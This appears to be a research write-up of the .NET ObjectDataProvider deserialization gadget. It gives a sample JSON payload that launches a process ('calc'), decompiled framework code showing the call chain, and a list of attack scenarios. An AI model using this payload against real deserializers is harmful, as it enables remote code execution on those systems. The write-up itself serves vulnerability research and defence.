# Sample JSON payload

```json
{"$type":"System.Windows.Data.ObjectDataProvider,
PresentationFramework, Version=4.0.0.0, Culture=neutral,
PublicKeyToken=31bf3856ad364e35","MethodName":"Start","MethodParamet
ers":{"$type":"System.Collections.ArrayList,
mscorlib","$values":["calc"]},"ObjectInstance":{"$type":"System.Diag
nostics.Process, System, Version=4.0.0.0, Culture=neutral,
PublicKeyToken=b77a5c561934e089"}}
```

# Source code

```csharp
// System.Windows.Data.ObjectDataProvider
public void set_ObjectInstance(object value)
{
...
    if (this.SetObjectInstance(value) && !base.IsRefreshDeferred)
    {
        base.Refresh();
    } 
}
```
```csharp
// System.Windows.Data.ObjectDataProvider
public void set_MethodName(string value)
{
        this._methodName = value;
        this.OnPropertyChanged("MethodName");
        if (!base.IsRefreshDeferred)
        {
            base.Refresh();
        } 
}...
```
```csharp
// System.Windows.Data.DataSourceProvider
public void Refresh()
{
  this._initialLoadCalled = true;
  this.BeginQuery();
}
```
```csharp
// System.Windows.Data.ObjectDataProvider
protected override void BeginQuery()
{
...
        if (this.IsAsynchronous)
        {
               ThreadPool.QueueUserWorkItem(new
WaitCallback(this.QueryWorker), null);
               return;
        }
        this.QueryWorker(null);
...
}
```
```csharp
// System.Windows.Data.ObjectDataProvider
private void QueryWorker(object obj)
{
...
Exception ex2 = null;
if (this._needNewInstance && this._mode ==
ObjectDataProvider.SourceMode.FromType)
{
        ConstructorInfo[] constructors =
this._objectType.GetConstructors();
        if (constructors.Length != 0)
        {
               this._objectInstance = this.CreateObjectInstance(out
ex2);
}
        this._needNewInstance = false;
        }
        if (string.IsNullOrEmpty(this.MethodName))
        {
} else {
    obj2 = this._objectInstance;
    obj2 = this.InvokeMethodOnInstance(out ex);
...
```
```csharp
// System.Windows.Data.ObjectDataProvider
private object InvokeMethodOnInstance(out Exception e)
{
...
    object[] array = new object[this._methodParameters.Count];
    this._methodParameters.CopyTo(array, 0);
    try
    {
            result = this._objectType.InvokeMember(this.MethodName, BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.FlattenHierarchy | BindingFlags.InvokeMethod | BindingFlags.OptionalParamBinding, null, this._objectInstance, array, CultureInfo.InvariantCulture);
    }
```

# Attack vector

This gadget is very flexible and offers various attack scenarios therefore we were able to use it for almost any unmarshaller:

* We can call any method of unmarshaled object (ObjectInstance + MethodName)
* We can call parametrized constructor of desired type with controlled parameters (ObjectType +
ConstructorParameters)
* We can call any public method including static ones with controlled parameters (ObjectInstance +
MethodParameters + MethodName or ObjectType + ConstructorParameters + MethodParameters + MethodName)